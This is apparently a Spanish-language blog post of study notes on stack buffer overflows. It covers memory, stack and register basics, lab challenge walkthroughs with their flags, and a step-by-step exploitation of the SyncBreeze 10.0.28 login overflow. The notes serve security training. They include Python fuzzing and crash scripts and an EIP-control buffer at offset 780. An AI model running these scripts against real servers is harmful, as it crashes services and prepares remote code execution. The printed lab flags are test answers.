---
layout: post
title: Buffer Overflows
subtitle: Buffer Overflows Basics.
tags: [pen]
---
### 1. Introduction to BuffersOverflow.

En este apartado cubriremos los fundamentos sobre los que se asienta una vulnerabilidad muy común denominada Buffer Overflow. Recorreremos:

- Cómo se usa la memoria en la ejecución de un programa.
- Cómo ocurre el desbordamiento del buffer.
- Cómo tomar control del flujo de ejecución de la aplicación.

<br />

#### 1.1. Program Memory.

Se denomina como *Memoria* a un dispositivo que el sistema utiliza para guardar información que se va a usar inmediatamente por el procesador en la gestión de procesos. Más concretamente, cuando se va a ejecutar un binario, se aloca en memoria una instancia de la imagen del binario a través de la cual, el procesador manejará los procesos asociados al binario.

Una representación de la memoria de acceso rápido de un ordenador podría ser la siguiente:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230217113018.png' | relative_url }}" text-align="center"/>
</div>

Ahí podemos ver como la memoria queda repartida entre un conjunto de direcciones de almacenamiento designadas en hexadecimal de forma que cada parte de la misma se divide en rangos de direcciones que creden o decrecen a conveniencia.

<br />

**El Stack**

Sabemos que la ejecución del código procedente de un binario o una librería se traduce en la creación de un proceso gestionado por el procesador a través de la fragmentación del mismo en *threads*, que pueden ser entendidos como la unidad de gestión mínima que maneja un procesador.

A su vez un thread requiere una pequeña área de memoria para alocar funciones, variables, etc. Esta pequeña área de memoria es lo que se denomina como Stack. Es decir, *el Stack es el conjunto de direcciones de memoria asociadas a un thread*. Las direcciones se agrupan en orden de más bajas a más altas de forma que la dirección de memoria que queda en la cota superior del stack es la primera que debe de ser liberada para poder acceder a las subsiguientes direcciones de memoria. A este modelo se le denomina LIFO (Last-In First Out):

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230218020624.png' | relative_url }}" text-align="center"/>
</div>

Para meter y sacar direcciones de memoria se emplena las instrucciones PUSH y POP de Assembly.

<br />

**Mecásnicas de la función 'return'.**

Cuando el código que se procesa dentro de un hilo llama a una función que devuelve un valor (return) necesita saber a qué dirección de memoria referirse para devolver el valor cuando la función se completa. A esta dirección de memoria se le denomina "return address" y cuando una función comienza a ejecutarse se guarda en el stack de forma que cuando la ejecución de la función termina de ejecutarse  (la cual se procesa en una parte del stack diferente a la del hilo principal denominada stackframe de la función) el flow de ejecución del hilo principal pueda retomarse donde se dejó. 

En pocas palabras, cuando finaliza una función, la dirección de retorno se toma de la pila y se usa para restaurar el flujo de ejecución al programa principal.

<br />

#### 1.2. CPU Registers.

Para generar una ejecución de código eficiente, el CPU hace uso de unos nueve dispositivos denominados *Registros* los cuales son contenedores de datos de 32 bits de muy rápido acceso. 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230220091629.png' | relative_url }}" text-align="center"/>
</div>

En la imagen anterior se pueden ver los nombres de cada uno de estos registros y la forma en la que se denominan a distintas partes de estos registros. Para ilustrar esto mejor consideremos la siguiente imagen:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230220092051.png' | relative_url }}" text-align="center"/>
</div>

Originalmente estos registros fueron pensados para arquitecturas de 16-bits y posteriormente se extendieron a 32-bits obteniendo en su nombre una 'E' al principio.

<br />

**Principales Registros**

Muchos de los registros anteriormente mencionados no tienen un uso concreto y se usan para almacenar datos a conveniencia según lo necesite el procesador. Sin embargo, de acuerdo a nuestros intereses prestamos atención a los siguientes registros:

- EAX (acumulator): Operaciones aritmeticas y lógicas.
- EBX (base): Puntero base para direcciones de memoria.
- ECX (counter): Contador para bucles o shift.
- EDX (data): direcciones de puertos I/O.  
- ESI (source index): direccionamiento de puntero de datos y fuente en operaciones de copia de strings.
- EDI (destination index): direccionamiento de puntero de datos y destino en operaciones de copia de strings.

<br />

**ESP - Stack Pointer**

El registro ESP guarda el puntero de la dirección referenciada más recientemente en el stack (top stack).

<br />

**EBP - Base Pointer**

Guarda un puntero que apunta al top del stack cuando se llama una función. 

<br />

**EIP - Instruction Pointer**

EIP, el puntero de instrucción, es uno de los registros más importantes para nuestros propósitos, ya que siempre apunta a la siguiente instrucción de código que se ejecutará. Dado que EIP esencialmente dirige el flujo de un programa, es el objetivo principal de un atacante cuando explota cualquier vulnerabilidad de corrupción de memoria, como un desbordamiento de búfer.
#### 1.3. Vulnerability Walkthrough.

Ahora vamos a desarrollar cómo asaltar esta vulnrabilidad de manera detallada.

A modo de resumen, esta vulnerabilidad se produce en una aplicación que no realiza una saneación adecuada del input del usuario. Debido a esto la aplicación recibe un input demasiado grande que no puede almacenar correctamente desbordando así el stack, esto es, sobreescribiendo registros que controlan el flow de ejecución de la aplicación ganando así ejecución remota de código.

<br />

**Exercises**

**3.  Para resolver este desafío, debe desbordar el búfer del binario bof-101 y provocar una falla de segmentación (no necesita explotar este desbordamiento). Este binario es una versión ligeramente modificada del "Código vulnerable de muestra" de la sección _10.2.1_ , y puede acceder al código fuente de este binario una vez conectado a través de SSH en la VM n.º 1.**

Nos logeamos dentro y observamos que existe un binario del cual tenemos acceso al código fuente.

```
┌──(student㉿dfe36034e119)-[~]
└─$ ls -la
[...]
-rwxr-xr-x 1 root    root    14432 Feb 20 12:35 bof-101
-rw-r--r-- 1 root    root      336 Feb 20 12:35 bof-101.c.txt
```

De esta forma, repasamos el código fuente y nos encontramos un código que lee input del usuario de forma inadecuada puesto que no verifica el tamaño del input que recibe pese a que este está limitado a 104 bites. 

```
──(student㉿dfe36034e119)-[~]
└─$ cat bof-101.c.txt 

#include <stdio.h>
#include <string.h>

#define BUFSIZE 104

int main(int argc, char *argv[])
{
  char buffer[BUFSIZE];

  if (argc < 2)
  {
    printf("Error - You must supply at least one argument\n");

    return 1;
  }

  // some extra code to display the flag on a segfault redacted here

  strcpy(buffer, argv[1]);
  return 0;
}
```

De esta forma, para obtener la bandera vamos a producir un desbordamiento del stack de este programa. Según la teoría, el código C anterior se procesará dentro de una función *main* que tiene asociado un stackframe en el stack cuyo tamaño está limitado de acuerdo a las indicaciones del código. En este caso, el tamaño asociado a la parte del código que correponde al buffer son 104 bites. Si nosotros introducimos un argumento superior a 104 bites el buffer quedará desbordado sobreescribiendo las partes adyacentes al stack (esto son los registros). Así: 

```
┌──(student㉿dfe36034e119)-[~]

./bof-101 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Great job. Here is your flag: 
OS{a7bf29aa82d5076d165eedc17a056152}
Nothing to see here
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

<br />

**4. Para resolver este desafío, debe encontrar la bandera dentro de navigating-code.exe disponible en la VM #2. Una vez descargado el ejecutable de Windows, para encontrar la flag, use las habilidades aprendidas en este módulo para depurar el código en su máquina cliente de Windows.**

Habilitamos el servicio SSH en nuestra máquina local y utilizamos SCP para pasar desde la máquina remota el ejecutable en cuestión:

```
scp ./navigating-code.exe kali@<IP>:/home/kali/Desktop
```

Una vez en nuestra máquina local lo pasamos a nuestra máquina windows arrastrando y soltando sobre la GUI (debemos tener instalado correctameten VMTools) y lo llevamos sobre el Immunityd Debugger.

En Immunity Debugger le damos sobre la ventana superior izquierda botón derecho > Search For > All referenced text string y nos encontraremos con un recuadro que tendrá la flag. Sobre este recuadro pulsamos botón derecho > Copy to clipboard > Whole line.

```
Text strings referenced in navigati:.text, item 7
 Address=00991665
 Disassembly=MOV DWORD PTR SS:[ESP],navigati.0099A094
 Text string=ASCII "OS{f675fc4ec21e1f2d8e4fd6ea299e55ba}"
```

<br />

**5. En la VM n.° 3, encontrará el binario _get-flag_ ubicado en la carpeta _de desafío_ que le hará cuatro preguntas sobre los registros de la CPU. La bandera de este desafío se devolverá si las cuatro preguntas se responden correctamente con las letras de 3 dígitos (AAA, BBB, CCC, etc.) correspondientes a los registros de 32 bits. Todas estas respuestas deben estar en mayúscula.**

```
┌──(student㉿81fafbb141f2)-[/challenge]
└─$ ./get-flag
Which register allows a function to keep track of required arguments, local variables, and the return address?
EBP
Which register is a general purpose register that is often used to store the results of logical instructions?
EAX
Which register controls the execution flow of the program by storing the address of the next instruction to be executed?
EIP
Which register stores the lowest memory address (top) of the stack and is dynamic based on how much memory a function needs to store data, arguments, and pointers?
ESP
Correct! The flag is: OS{bdba5d6926647e2314d3c33746d52131}
```

<br />

**6.  Inicie sesión en la máquina de destino n.º 4 mediante RDP con las credenciales proporcionadas. En el escritorio de este usuario, encontrará un binario llamado overflowing-eip.exe. Si tuviéramos que ejecutar este binario, simplemente fallaría. Por qué se bloquea es bastante interesante. El programa asigna un búfer de 64 bytes en la memoria para el almacenamiento de una cadena. Luego, utiliza una función C incorporada insegura para copiar una cadena específica en esa ubicación de memoria, sin verificar la longitud de la cadena. La longitud de esta cadena supera los 64 bytes preasignados y esto da como resultado un ejemplo clásico de desbordamiento de búfer. Para este ejercicio, deberá abrir el binario en Immunity Debugger, que ya está instalado en la máquina de destino. Una vez que el programa se abre y se detiene, reanude su ejecución y observe el bloqueo. A continuación, eche un vistazo al estado de los registros en el momento del accidente. El registro EIP se sobrescribiría con cuatro caracteres 'B' ( 0x42424242en hexadecimal). En el momento del bloqueo, la bandera que necesita recopilar se encuentra en la pila de la memoria y el registro ESP apunta a esa ubicación de la memoria. Para recuperar la bandera, haga clic derecho en la dirección almacenada en el registro ESP y seleccione 'Seguir en volcado'. La bandera se compone de los primeros veinte (20) bytes en la pila en esa ubicación de memoria.**

Abrimos la máquina y nos logeamos con rdesktop:

```
rdesktop -u student -p lab <IP>
```

Abrimos Immunity Debugger y abrimos el binario y luego le damos al signo de play para ejecutarlo. Al crashearse se muestran el valor de los registros en la ventana de la derecha. Podemos ver que a partir de un cierto punto todos los registros han quedado sobreescritos con 'A' (41 en hex) pero el EIP ha quedado sobrescrito con 'B' (42). La flag queda a la vista.

```
EAX 00000000
ECX 0061FE80 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBOS{ae9a57713530cb3aed055cdf6c15ac33}{}w00tw00t"
EDX 00743030
EBX 41414141
ESP 0061FEE0 ASCII "OS{ae9a57713530cb3aed055cdf6c15ac33}{}w00tw00t"
EBP 41414141
ESI 41414141
EDI 41414141
EIP 42424242
C 0  ES 002B 32bit 0(FFFFFFFF)
P 1  CS 0023 32bit 0(FFFFFFFF)
A 0  SS 002B 32bit 0(FFFFFFFF)
Z 1  DS 002B 32bit 0(FFFFFFFF)
S 0  FS 0053 32bit 2F4000(FFF)
T 0  GS 002B 32bit 0(FFFFFFFF)
D 0
O 0  LastErr ERROR_MOD_NOT_FOUND (0000007E)
EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
ST0 empty g
ST1 empty g
ST2 empty g
ST3 empty g
ST4 empty g
ST5 empty g
ST6 empty g
ST7 empty g
               3 2 1 0      E S P U O Z D I
FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
FCW 037F  Prec NEAR,64  Mask    1 1 1 1 1 1

```

<br />

**7.  Este desafío evaluará su comprensión de la pila en la memoria del programa. Inicie sesión en la máquina virtual n.º 5 de la máquina de destino a través de RDP con las credenciales proporcionadas. En el escritorio de este usuario, encontrará un binario llamado ejemplo.exe y dos archivos de texto con fragmentos de código fuente C: ejemplo.c.txt y push_and_pop.c.txt . Para resolver este desafío, primero estudie el código de ejemplo y luego observe su ejecución ejecutando el programa example.exe desde una ventana del símbolo del sistema. Con una buena comprensión de cómo funciona la pila en la memoria, dirija su atención al archivo push_and_pop.c.txt. La bandera es el valor que se imprimirá cuando se ejecute este programa. Puedes asumir que *stack* , *push* y *pop* son funciones definidas apropiadamente y funcionan como se esperaba. NOTA: los valores hexadecimales de la bandera presentes en el archivo push_and_pop.c.txt no requieren ninguna conversión adicional antes del envío.**

El código mostrado es el siguiente de forma que:

```> cat source.c
#include <stdio.h>

int main() {

    struct Stack* stack = createStack(100);

    char *a, *b, *c, *d;
    char *value1 = "\xa9\x67\x5f\x62";
    char *value2 = "\x7b\xec\x65\x22";
    char *value3 = "\x7d\x25\x11\xe5";
    char *value4 = "\x8e\x4f\x24\xed";
    char *value5 = "\x25\x58\x3a\xf3";
    char *value6 = "\x95\xf4\x50\x83";
    char *value7 = "\xef\xb9\x31\xd1";

    push(stack, value1);
    push(stack, value2);
    a = pop(stack);
    push(stack, value3);
    push(stack, value4);
    b = pop(stack);
    push(stack, value5);
    push(stack, value6);
    c = pop(stack);
    push(stack, value7);
    d= pop(stack);

    printf("The flag is OS{");
    printf("%s%s%s%s", a,b,c,d);
    printf("}\r\n");

    return 0;
}
```

Una adecuada comprensión de cómo funciona la meomriya y las instrucciones asembly PUSH y POP nos permite entender que por el principio de ordenamiento del stack LIFO (Last-In First-Out) a tiene el valor 'value2' porque es el último que se mete y por tanto el primero en salir, b tiene el 'value4', c el 'value6' y d 'value7', quitando las '\\x' a las líneas y ordenandolas de izquierda a derecha obtenemos la flag: 'OS{7bec65228e4f24ed95f45083efb931d1}'.

<br />

### 2. Windows Buffer Overflows.

En este módulo, demostraremos cómo descubrir y explotar una vulnerabilidad en la aplicación SyncBreeze. Aunque estamos examinando una vulnerabilidad conocida, seguiremos los pasos necesarios para "descubrirla" y no nos basaremos en investigaciones anteriores para esta aplicación. Básicamente, esto replicará el proceso de descubrir y explotar un desbordamiento de búfer.

Este proceso requiere varios pasos. Primero, debemos descubrir una vulnerabilidad en el código (sin acceso a la fuente). Luego, tenemos que crear nuestra entrada de tal manera que obtengamos el control de los registros críticos de la CPU. Finalmente, necesitamos manipular la memoria para obtener una ejecución remota confiable del código.

<br />

#### 2.1. Discovering the Vulnerability.

En un sentido general y amplio, hay tres técnicas fundamentales para identificar debilidades en aplicaciones. El primero es analizar el código fuente, el segunfo es realizar ingenieria inversa de la aplicación y el tercero es el fuzzing, introducir una concatenación de entradas a la aplicación para intentar obtener un comportamiento extraño de la misma.

Nosotros nos centraremos en el fuzzing. Como hemos mencionado, el objetivo del fuzzing es proporcionar a la aplicación input (intencionalmente malformado) que esta no sepa manejar correctamente para obtener un comportamiento no esperado por su parte que pueda conducir a una potencial vulnerabilidad. Sabremos que esto a funcionado en el momento en el que obtengamos un crasheo por parte de la aplicación. 

Hay muchas categorías diferentes de herramientas y técnicas de fuzzing que podemos emplear en función de nuestras necesidades particulares. Un fuzzer se considera generation-based si crea entradas de aplicaciones mal formadas desde cero, siguiendo cosas como el formato de archivo o las especificaciones del protocolo de red. Un fuzzer basado en mutaciones cambia las entradas existentes mediante el uso de técnicas como el intercambio de bits para crear una variante mal formada de la entrada original.

En términos generales, un fuzzer que conoce el formato de entrada de la aplicación se puede clasificar como un fuzzer inteligente.

<br />

##### 2.1.1. Fuzzing the HTTP Protocol.

Vamos a repasar un caso real. En 2017, una vulnerabilidad Buffer Overflow se descubrió en mecanismo de logeo de la aplicación SyncBreeze 10.0.28, concretamente el campo del nombre de usuario podía ser utilizado para crashear la aplicación. Observemos que no hacen falta unas credenciales válidas para esta vulnrebilidad, técnicamente es lo que se considera una pre-authentication buffer overflow vulnerability. 

Si quisiéramos reproducir esta vulnerabilidad en el servicio tendríamos que primero iniciarlo a través de Servicios > SyncBreeze > Botón derecho > Start.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230221110704.png' | relative_url }}" text-align="center"/>
</div>

En principio, y con el servicio ya corriendo podemos centrarnos en el proceso de descubrimiento de la vulnerabilidad. En principio, con un absoluto desconocimiento de la misma procederíamos a fuzzear cualquier campo que admitiera input del usuario esperando un comportamiento anormal de la aplicación. 

Para mayor detalle, podemos intentar visualizar con Wireshark qué datos se envían.

Así, abrimos Wireshark para monitorizar tráfico TCP sobre el puerto 80 en la interfaz de red adecuada y procedemos a logearnos:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230221125657.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230221125706.png' | relative_url }}" text-align="center"/>
</div>

Inspeccionamos el stream TCP que se muestar como sigue:

```
POST /login HTTP/1.1
Host: 10.11.0.22
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.0.22/login
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=AAAA&password=BBBBHTTP/1.1 200 OK


Content-Type: text/html
Content-Length: 730

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/h
<html>
<head>
<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
<meta name='Author' content='Flexense HTTP Server v10.0.28'>
<meta name='GENERATOR' content='Flexense HTTP v10.0.28'>
<title>Sync Breeze Enterprise @ DESKTOP-4MK82OB - Error</title>
<link rel='stylesheet' type='text/css' href='resources/syncbreeze.css' media='all'>
</head>
<body>
<center>
<div class='error_message' style='margin-top: 200px;'>
<p>The specified user name and/or password is incorrect.</p>
</div>
<input style='margin-top: 20px;' type='button' value='Close' onClick="history.go(-1);"
</center>
</body>
</html>
```

En el stream se muestra tanto la respuesta la HTTP request como la HTTP Response. Podemos aprovecharnos de esto para reproducir la estructura de la request con el siguiente código:

```
#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."

    size = 100
    
    inputBuffer = "A" * size
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.11.0.22\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("10.11.0.22", 80))
    s.send(buffer)
    
    s.close()

    print "\nDone!"
    
except:
    print "Could not connect!"
```

Este abre un socket, define una serie de variables entre las que se encuentra una llamada 'buffer' en la que construye una replicación de la HTTP request (observemos que \\r\\n) sirve para añadir saltos de línea.

Este prototipo de código puede usarse para comprobar su validez y seguidamente a partir de él crear un fuzzer que incremente poco a poco el tamaño del buffer hasta conseguir un crasheo.

Por una cuestión de conveniencia hemos creado un bucle que limita el incremento hasta 2000, cifra en la que sabemos con certeza que se producirá el crasheo.

```
#!/usr/bin/python
import socket
import time
import sys

size = 100

while(size < 2000):
  try:
    print "\nSending evil buffer with %s bytes" % size
    
    inputBuffer = "A" * size
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.11.0.22\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://10.11.0.22/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("10.11.0.22", 80))
    s.send(buffer)
    
    s.close()

    size += 100
    time.sleep(10)
    
  except:
    print "\nCould not connect!"
    sys.exit()
```

De esta forma, vinculamos el servicio con un debugger (Immunity Debugger), lo lanzamos como usuario administrador y con la finalidad de vincular el servicio SyncBreeze antes debemos saber qué proceso es el que escucha en el puerto 80. Para ello, utilizamos TCPView y vemos que en el puerto 80 escucha un proceso cuyo PID es 688 que tiene un ejecutable de *syncbrs.exe*. 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230221144221.png' | relative_url }}" text-align="center"/>
</div>

Asi, desde Immunity Debugger utilizamos *File* > *Attach* 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230221144645.png' | relative_url }}" text-align="center"/>
</div>

Al vincular el proceso al debugger paramos la ejecución del mismo y necesitamos reanudarlo con F9.

Ahora que el debugger está conectado y SyncBreeze se está ejecutando, podemos ejecutar el script de fuzzing, que produce el siguiente resultado:

```
kali@kali:~$ ./fuzzer.py
Fuzzing username with 100 bytes
...
Fuzzing username with 800 bytes
Fuzzing username with 900 bytes
```

Cuando nuestro búfer de nombre de usuario alcanza aproximadamente 800 bytes de longitud, el depurador nos presenta una infracción de acceso al intentar ejecutar el código en la dirección 41414141:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230221144842.png' | relative_url }}" text-align="center"/>
</div>

Lo que ha ocurrido es una parada brusca de la aplicación debido a que en un momento se ha recibido un input demasiado grande y ha sobreescrito áreas adyacentes al stackframe reservado para el buffer, en concreto ha sobreescrito el registro EIP que señala a la siguiente instrucción a ser ejecutada.

El CPU no pudo interpretar correctamente la dirección del EIP y por tanto se ha crasheado. Esto que puede parecer inocuo tiene un peligro más profundo debido a que si controlamos el valor del registro que apunta a la siguiente instrucción a ser ejecutada, entonces podemos cargar código malicioso junto con el argumento y manipular el EIP para que apunte a la ejecución de nuestro código malicioso obteniendo así ejecución remota de código.

<br />

#### 2.2. Win32 Buffer Overflow Explotation.

Como hemos señalado anteriormente, la clave para volver explotable una debilidad de desbordamiento de búffer es tomar control sobre el registro EIP que contiene un puntero dirigido a la siguiente instrucción a ejecutar. 

Antes de proceder veámos un par de cosas que nos servirá de antecedente.

##### 2.2.1. EIP several protections.

Conforme se ha ido desarrollando el entendimiento de la vulberabilidad BufferOverflow, distintos mecanismos de seguridad y formas de superar estos mecanismos se han ido desarrollando. Entre los mecanismos más frecuentes encontramos:

- *DEP (Data Execution Prevention)*: Un conjunto de dispositivos tanto a nivel de hardware como de software que proporcionan un checkeo extra a nivel de memoria para prevenir ejecución de código malicioso generando una 'excepción' cuando se da un evento así.

- *ASLR (Address Space Layout Randomization)*: aleatoriza las base address de las aplicaciones cargadas y las DLL cada vez que se inicia el sistema operativo.

- *CFG (Control Flow Guard)*: Implementa un control del flujo de ejecución impidiendo la sobreescritura de ciertos registros.

La aplicación que estamos asaltando no tiene estas medidas de protección.

<br />

##### 2.2.2. Controlling EIP.

**Replicating the Crash**

En función del output del fuzzer, podemos suponer que SyncBreeze puede ser vulnerable a un desbordamiento de búfer cuando se envía un nombre de usuario con una longitud de aproximadamente 800 bytes a través de la solicitud HTTP POST durante el inicio de sesión. Nuestra primera tarea en el proceso de explotación es escribir un script simple que replicará nuestro bloqueo observado, sin tener que ejecutar el fuzzer cada vez. Nuestro nuevo script se vería como sigue:

```
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."
  
  size = 800
  
  inputBuffer = "A" * size
  
  content = "username=" + inputBuffer + "&password=A"

  buffer = "POST /login HTTP/1.1\r\n"
  buffer += "Host: 10.11.0.22\r\n"
  buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += "Accept-Language: en-US,en;q=0.5\r\n"
  buffer += "Referer: http://10.11.0.22/login\r\n"
  buffer += "Connection: close\r\n"
  buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += "Content-Length: "+str(len(content))+"\r\n"
  buffer += "\r\n"
  
  buffer += content

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("10.11.0.22", 80))
  s.send(buffer)
  
  s.close()
  
  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

Cuando se ejecuta, este script provoca un crasheo similar a la que hemos observado anteriormente. En otras palabras, podemos replicar consistentemente el accidente. Este es un buen primer paso.

<br />

**Controlling the EIP**

Obtener el control del registro EIP es un paso crucial al explotar las vulnerabilidades de corrupción de la memoria. El registro EIP es similar a las riendas de un caballo; podemos usarlo para controlar la dirección o el flujo de la aplicación. Sin embargo, en este punto solo sabemos que alguna sección desconocida de nuestro búfer sobrescribió el registro EIP con AAAA:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230221175138.png' | relative_url }}" text-align="center"/>
</div>

Antes de que podamos cargar una dirección de destino válida en el puntero de instrucción y controlar el flujo de ejecución, necesitamos saber exactamente qué parte de nuestro búfer aterriza en el EIP.

Hay dos formas comunes de hacer esto:

- Primero, podríamos intentar un *binary tree analysis*. En lugar de 800 A, enviamos 400 A y 400 B. Si EIP se sobrescribe con B, sabemos que los cuatro bytes residen en la segunda mitad del búfer. Luego cambiamos los 400 B a 200 B y 200 C, y enviamos el búfer nuevamente. Si EIP se sobrescribe con C, sabemos que los cuatro bytes residen en el rango de 600 a 800 bytes. Continuamos dividiendo el búfer específico hasta llegar a los cuatro bytes exactos que sobrescriben EIP. Matemáticamente, esto debería suceder en siete iteraciones.

- Sin embargo, existe una forma más rápida de identificar la ubicación de estos cuatro bytes. Podríamos usar una cadena lo suficientemente larga que consiste en fragmentos de 4 bytes que no se repiten como nuestra entrada de fuzzing. Luego, cuando el EIP se sobrescribe con 4 bytes de nuestra cadena, podemos usar su secuencia única para identificar exactamente dónde se encuentran en todo el búfer de entrada. Si bien esto puede ser un poco difícil de entender al principio, se vuelve más claro cuando aplicamos la técnica.

Usaremos el script Ruby *pattern_create.rb* de Metasploit para ayudarnos con este enfoque. El script *pattern_create.rb* se encuentra en /usr/share/metasploit-framework/tools/exploit/ pero se puede ejecutar desde cualquier ubicación en Kali ejecutando msf-pattern_create como se muestra a continuación:

```
kali@kali:~$ locate pattern_create
/usr/bin/msf-pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb

kali@kali:~$ msf-pattern_create -h
Usage: msf-pattern_create [options]
Example: msf-pattern_create -l 50 -s ABC,def,123
Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf

Options:
    -l, --length <length>            The length of the pattern
    -s, --sets <ABC,def,123>         Custom Pattern Sets
    -h, --help                       Show this message
```

Para crear la cadena para nuestra prueba de concepto, pasamos el parámetro -l , que define la longitud de nuestra cadena requerida ( 800 ):

```
kali@kali:~$ msf-pattern_create -l 800
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak
...
```

El siguiente paso es actualizar nuestro script de Python, reemplazando el búfer existente de 800 A con esta nueva cadena única:

```
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa...1Ba2Ba3Ba4Ba5Ba"

  content = "username=" + inputBuffer + "&password=A"
...
```

Cuando reiniciamos SyncBreeze y ejecutamos nuestro exploit nuevamente, notamos que EIP contiene una nueva cadena, similar a la que se muestra a continuación:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230221180053.png' | relative_url }}" text-align="center"/>
</div>

El registro EIP se ha sobrescrito con *42306142* , la representación hexadecimal de los cuatro caracteres "B0aB". 


Sabiendo esto, podemos usar el compañero de pattern_create.rb, llamado *pattern_offset.rb*, para determinar el desplazamiento de estos cuatro bytes específicos en nuestra cadena. En Kali, este script se puede ejecutar desde cualquier ubicación con msf-pattern_offset .

Para encontrar el desplazamiento donde ocurre la sobrescritura de EIP, podemos usar -l para especificar la longitud de nuestra cadena original (en nuestro caso, 800) y -q para especificar los bytes que encontramos en EIP (42306142):

```
kali@kali:~$ msf-pattern_offset -l 800 -q 42306142
[*] Exact match at offset 780
```

El script msf-pattern_offset informa que estos cuatro bytes están ubicados en el desplazamiento 780 del patrón de 800 bytes. Traduzcamos esto a una nueva cadena de búfer modificada y veamos si podemos obtener cuatro B (0x42424242) para aterrizar precisamente en el registro EIP:

```
#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler = "A" * 780
  eip = "B" * 4
  buffer = "C" * 16

  inputBuffer = filler + eip + buffer
  
  content = "username=" + inputBuffer + "&password=A"
...
```

Esta vez, el servidor web falla, el búfer resultante está perfectamente estructurado y EIP ahora contiene nuestras cuatro B (0x42424242) como se muestra a continuación:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230221180120.png' | relative_url }}" text-align="center"/>
</div>

